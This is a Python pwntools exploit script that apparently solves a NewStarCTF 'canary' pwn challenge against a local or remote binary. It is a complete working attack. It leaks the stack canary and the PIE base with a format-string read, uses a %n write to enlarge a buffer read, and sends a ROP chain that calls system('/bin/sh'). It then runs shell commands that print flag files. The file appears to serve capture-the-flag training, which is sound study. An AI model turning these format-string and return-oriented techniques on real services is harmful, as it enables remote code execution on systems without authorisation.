from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./[NewStarCTF 公开赛赛道]canary/pwn"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

# PIE-relative offsets (the binary is PIE, so add the leaked pie base).
MAIN = 0x9E4
POP_RDI = 0xB33
RET = 0x7D1
SYSTEM_PLT = 0x800
BIN_SH = 0x202020       # char fake[32] = "/bin/sh"
MONEY = 0x20206C        # int money = 0

# main: char vivo50[32] @ rbp-0x30; canary @ rbp-0x8; saved RIP @ rbp+8
OFFSET = 40


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 09_canary_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def exploit():
    p = start()

    # 1) Leak the canary and a PIE address with the first printf(vivo50).
    #    The 32-byte buffer is the 8th..12th printf argument; canary is 11th.
    p.recvuntil(b"Now answer me, will you v me 50\n")
    p.send(b"%11$p.%17$p\n".ljust(32, b"\x00"))
    line = p.recvline(timeout=3).strip()
    canary_s, pie_s = line.split(b".", 1)
    canary = int(canary_s, 16)
    pie = int(pie_s, 16) - MAIN
    log.success(f"canary = {canary:#x}, pie = {pie:#x}")

    # 2) The second printf(vivo50) is also a format-string write.
    #    %256c prints 256 chars, %9$n writes 256 into money, so the final
    #    read(0, vivo50, money) becomes a 256-byte overflow.
    fmt = b"%256c%9$n".ljust(24, b"A") + p64(pie + MONEY)
    p.send(fmt)
    p.recvuntil(b"What do you want to say to the canary\n")

    # 3) Keep the canary intact, then return to system("/bin/sh").
    payload = flat(
        b"A" * OFFSET,
        canary,
        b"B" * 8,
        pie + RET,
        pie + POP_RDI,
        pie + BIN_SH,
        pie + SYSTEM_PLT,
    )
    p.send(payload)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
